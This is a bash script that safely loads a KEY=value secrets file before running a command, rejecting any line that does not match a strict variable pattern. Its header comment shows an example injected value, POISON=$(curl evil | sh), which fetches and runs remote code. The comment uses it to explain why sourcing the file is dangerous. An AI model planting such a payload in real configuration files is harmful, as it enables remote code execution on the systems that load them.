#!/usr/bin/env bash
# load-secrets-env.sh — safely load a KEY=value secrets file, then run a command.
#
# Usage: scripts/load-secrets-env.sh <env-file> [--] <command> [args...]
#
# Replaces the dangerous `set -a && . file && set +a` idiom: sourcing executes
# the file as shell, so a tampered or hand-edited value like
# POISON=$(curl evil | sh) would RUN. This loader instead accepts only lines
# matching ^[A-Z_][A-Z0-9_]*=.*$ (blank lines and #-comments are skipped) and
# exports each value literally — no eval, no source, no substitution. Any
# other line aborts the load without running the command.
#
# Used by the Makefile (prod-up, prod-pull) so compose still interpolates
# POSTGRES_PASSWORD / KC_ADMIN_PASSWORD exactly as before for the generated
# hex/base64 values.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=scripts/backup-lib.sh
. "${SCRIPT_DIR}/backup-lib.sh"

if [ $# -lt 2 ]; then
  echo "Usage: scripts/load-secrets-env.sh <env-file> [--] <command> [args...]" >&2
  exit 1
fi

ENV_FILE="$1"
shift
if [ "${1:-}" = "--" ]; then
  shift
fi
if [ $# -lt 1 ]; then
  echo "Usage: scripts/load-secrets-env.sh <env-file> [--] <command> [args...]" >&2
  exit 1
fi

fc_load_secrets_env "${ENV_FILE}"
exec "$@"
